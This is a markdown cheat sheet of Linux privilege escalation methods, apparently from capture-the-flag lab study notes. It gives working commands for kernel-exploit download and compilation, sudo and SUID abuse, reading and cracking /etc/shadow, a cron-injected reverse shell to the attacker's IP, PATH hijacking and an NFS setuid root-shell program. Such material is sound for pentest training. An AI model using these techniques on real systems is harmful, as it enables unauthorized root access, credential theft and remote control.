# 🔐 Privilege Escalation (P.E.)

---

## (1) Kernel Exploit-Based Privilege Escalation

In this method, we exploit vulnerabilities in the kernel.

### Steps:

1. Gain access to the system.

2. Check the kernel version:

   ```bash
   uname -r
   ```

3. Search online for known exploits for that kernel version.

4. If an exploit is found, download it to your **local machine (Kali)**:

   ```bash
   cd ~/Downloads
   python3 -m http.server 8000
   ```

   This starts a local HTTP server.

5. On the **target machine**, navigate to `/tmp`, then download the exploit:

   ```bash
   wget http://<Your_Local_IP>:8000/<exploit_filename>
   ```

6. Compile the exploit:

   ```bash
   gcc <exploit_filename> -o exploit
   chmod +x exploit
   ```

7. Run the exploit:

   ```bash
   ./exploit
   ```

✅ You should now have root access.

---

## (2) Sudo-Based Privilege Escalation

This method exploits misconfigured `sudo` permissions.

### Steps:

1. Check sudo permissions:

   ```bash
   sudo -l
   ```
2. Identify exploitable binaries (e.g., `nano`, `less`).
3. Visit [GTFOBins](https://gtfobins.github.io/) and search for the binary.
4. Follow the instructions to escalate privileges.

✅ You’ll gain root access if the binary is misconfigured.

---

## (3) SUID-Based Privilege Escalation

This method uses files with the SUID bit set.

### Steps:

1. Find all SUID files:

   ```bash
   find / -type f -perm -04000 -ls 2>/dev/null
   ```
2. Check each binary on [GTFOBins](https://gtfobins.github.io/).
3. For example, using `base64`:

   ```bash
   LFILE=/etc/shadow
   /usr/bin/base64 "$LFILE" | base64 --decode
   ```
4. Save the hash:

   ```bash
   nano user2hash.txt
   ```
5. Crack it with `john`:

   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt user2hash.txt
   ```
6. Switch to the cracked user:

   ```bash
   su user2
   ```
7. Repeat for other protected files as needed.

✅ Now you can read restricted files.

---

## (4) Capabilities-Based Privilege Escalation

Linux capabilities may grant elevated privileges.

### Steps:

1. Check capabilities:

   ```bash
   getcap -r / 2>/dev/null
   ```
2. Match them on [GTFOBins](https://gtfobins.github.io/).
3. Example exploit:

   ```bash
   ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
   ```

✅ You now have a root shell.

---

## (5) Cron Jobs-Based Privilege Escalation

This method exploits writable cron-executed scripts.

### Steps:

1. Check crontabs:

   ```bash
   cat /etc/crontab
   ```
2. Identify writable files:

   ```bash
   ls -la /path/to/script.sh
   ```
3. Inject a reverse shell:

   ```bash
   bash -i >& /dev/tcp/<Your_IP>/<Port> 0>&1
   ```
4. Start listener:

   ```bash
   nc -lvnp <Port>
   ```
5. Set permissions if needed:

   ```bash
   chmod +x /path/to/script.sh
   ```

✅ A reverse shell connects as root.

---

## (6) \$PATH-Based Privilege Escalation

This exploits commands executed without full paths.

### Steps:

1. Check PATH:

   ```bash
   echo $PATH
   ```
2. Prepend your directory:

   ```bash
   export PATH=/tmp:$PATH
   ```
3. Create a fake binary (e.g., `thm`):

   ```bash
   echo "/bin/bash" > /tmp/thm
   chmod +x /tmp/thm
   chmod +s /tmp/thm
   chmod 777 /tmp/thm
   ```
4. Check permissions:

   ```bash
   ls -la /tmp/thm
   ```
5. Run the vulnerable program:

   ```bash
   ./test
   ```

✅ You get root access.

---

## (7) NFS-Based Privilege Escalation

Abuse misconfigured NFS shares.

### Local Machine:

1. Check exported shares:

   ```bash
   showmount -e <Target_IP>
   ```

### Target Machine:

2. Confirm:

   ```bash
   cat /etc/exports
   ```

   Ensure `rw` and `no_root_squash` are enabled.

### Local:

3. Mount the share:

   ```bash
   mkdir /mnt/nfs
   mount -o rw <Target_IP>:/home/ubuntu/sharedfolder /mnt/nfs
   ```

4. Create a root shell script:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

5. Compile statically:

   ```bash
   gcc -static rootshell.c -o code
   chmod +x code
   chmod +s code
   ```

### Target:

6. Execute:

   ```bash
   ./sharedfolder/code
   ```

✅ Root shell gained.

---

